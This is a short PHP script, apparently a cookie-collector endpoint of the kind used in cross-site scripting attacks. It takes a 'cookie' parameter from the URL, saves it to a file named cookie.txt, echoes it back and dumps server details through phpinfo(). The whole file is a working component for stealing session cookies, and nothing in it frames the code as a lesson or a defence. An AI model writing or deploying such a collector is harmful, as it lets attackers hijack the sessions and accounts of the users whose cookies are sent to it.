<?php
    $cookie=$_GET['cookie'];
    file_put_contents('cookie.txt', $cookie);
    echo($cookie);
    phpinfo();
?>